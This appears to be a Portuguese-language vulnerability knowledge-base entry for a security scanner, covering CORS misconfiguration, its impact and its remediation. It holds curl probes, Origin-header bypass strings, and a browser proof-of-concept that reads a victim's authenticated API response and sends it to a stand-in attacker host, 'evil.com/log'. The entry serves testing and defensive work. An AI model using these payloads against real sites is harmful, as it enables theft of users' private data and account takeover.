---
id: cors_misconfiguration
title: "CORS Misconfiguration"
module: "cors"
severity: "HIGH"
cwe_id: "CWE-942"
cwe_title: "Permissive Cross-domain Policy with Untrusted Domains"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
vrt_id: "broken_authentication_and_session_management.authentication_bypass.other"
---

## Summary
Política de CORS que reflete origens arbitrárias ou confia em subdomínios comprometidos, combinada com credenciais, permite que um site malicioso leia respostas autenticadas e execute ações em nome da vítima.

## Description
O Same-Origin Policy (SOP) impede que `https://evil.com` leia respostas de `https://alvo.com`. O CORS relaxa essa regra por meio de cabeçalhos `Access-Control-Allow-Origin` (ACAO), `Access-Control-Allow-Credentials` (ACAC) e `Access-Control-Allow-Methods/Headers`. A configuração é insegura quando:

- Reflete o header `Origin` sem validação (`ACAO: <Origin>`).
- Usa `Access-Control-Allow-Origin: *` junto de `Allow-Credentials: true` (navegadores bloqueiam, mas proxies e clients não).
- Confia em qualquer subdomínio (`*.alvo.com`) e há subdomain takeover ou XSS em um subdomínio.
- Aceita `Origin: null` (sandboxed iframe, `file://`, data URL) com credenciais.
- Valida a origem por `startsWith`, `endsWith` ou regex fraca, permitindo `https://alvo.com.evil.com`, `https://evilalvo.com` ou `https://alvo.com@evil.com`.
- Permite métodos sensíveis (`PUT`, `DELETE`, `PATCH`) e headers de autenticação para origens não confiáveis.

O impacto depende de o endpoint retornar dados sensíveis e de o navegador enviar cookies (`credentials: include`). Sem credenciais, o atacante ainda pode ler dados públicos ou de APIs com token no header, se conseguir induzir a vítima a executar o fetch.

## Impact
- Leitura cross-origin de dados autenticados: perfil, e-mail, tokens, faturas, mensagens, dados de outros usuários.
- Ações state-changing em nome da vítima (alterar e-mail/senha, criar chaves de API, transferir recursos).
- Account takeover quando o endpoint expõe tokens ou permite troca de credenciais.
- Encadeamento com subdomain takeover/XSS para ampliar o alcance.
- Vazamento de dados entre tenants e violação de LGPD.

## Payloads and Bypasses
```bash
# Reflexão básica de Origin
curl -s -D - https://alvo.com/api/me \
  -H 'Origin: https://evil.com' \
  -H 'Cookie: session=<cookie>' | grep -i 'access-control'

# Origem null
curl -s -D - https://alvo.com/api/me \
  -H 'Origin: null' \
  -H 'Cookie: session=<cookie>'

# Subdomínio controlado / lookalike
curl -s -D - https://alvo.com/api/me -H 'Origin: https://evil.alvo.com'
curl -s -D - https://alvo.com/api/me -H 'Origin: https://alvo.com.evil.com'
curl -s -D - https://alvo.com/api/me -H 'Origin: https://evilalvo.com'
curl -s -D - https://alvo.com/api/me -H 'Origin: https://alvo.com@evil.com'
curl -s -D - https://alvo.com/api/me -H 'Origin: http://alvo.com'

# Preflight
curl -s -X OPTIONS https://alvo.com/api/me \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: PUT' \
  -H 'Access-Control-Request-Headers: authorization,content-type' -D -
```

PoC em navegador:
```html
<script>
fetch('https://alvo.com/api/me', {
  method: 'GET',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'}
})
.then(r => r.text())
.then(d => fetch('https://evil.com/log?d=' + encodeURIComponent(d)));
</script>
```

Variações de bypass de validação:
```text
Origin: https://alvo.com.evil.com
Origin: https://evil.com/alvo.com
Origin: https://alvo.com%2eevil.com
Origin: https://alvo.com:443.evil.com
Origin: https://alvo.com@evil.com
Origin: https://alvo.com#@evil.com
Origin: null
Origin: file://
Origin: https://sub.alvo.com    # se subdomain takeover/XSS
```

Casos reais e mentalidade de ataque (RWBH): programas como Uber e Yahoo já tiveram políticas que refletiam origens; o atacante procura subdomínios abandonados, `Origin: null` e endpoints que retornam tokens/perfil com credenciais.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `Origin` (header), `callback`, `redirect_uri`, `return_url`.
- **Paths comuns:** `/api/*`, `/api/v1/user`, `/api/me`, `/graphql`, `/oauth/token`, `/admin/api/*`.
- **Sinais:** `ACAO` refletindo `Origin`; `ACAC: true`; `ACAO: *` em endpoint autenticado; `Vary: Origin` ausente; métodos `PUT/DELETE` liberados.

## Recommendation
1. Usar allowlist explícita de origens exatas (esquema + host + porta), nunca reflexão crua ou regex permissiva.
2. Não combinar `Access-Control-Allow-Origin: *` com credenciais; para APIs públicas sem credenciais, `*` é aceitável.
3. Rejeitar `Origin: null` e origens desconhecidas com resposta sem cabeçalhos CORS.
4. Validar a origem no servidor após parse completo da URL, comparando host exato; não usar `startsWith`/`endsWith`.
5. Enviar `Vary: Origin` para evitar cache poisoning de respostas CORS.
6. Limitar métodos e headers ao necessário; não liberar `Authorization` para origens não confiáveis.
7. Preferir tokens no header `Authorization` a cookies para APIs cross-origin; se usar cookies, exigir `SameSite=Lax/Strict` e CSRF token.
8. Exemplo Spring:
```java
@Bean
CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration c = new CorsConfiguration();
    c.setAllowedOrigins(List.of("https://app.alvo.com", "https://admin.alvo.com"));
    c.setAllowedMethods(List.of("GET", "POST"));
    c.setAllowedHeaders(List.of("Content-Type", "Authorization"));
    c.setAllowCredentials(true);
    UrlBasedCorsConfigurationSource s = new UrlBasedCorsConfigurationSource();
    s.registerCorsConfiguration("/api/**", c);
    return s;
}
```
9. Monitorar subdomínios e remover registros DNS órfãos para evitar bypass via subdomain takeover.
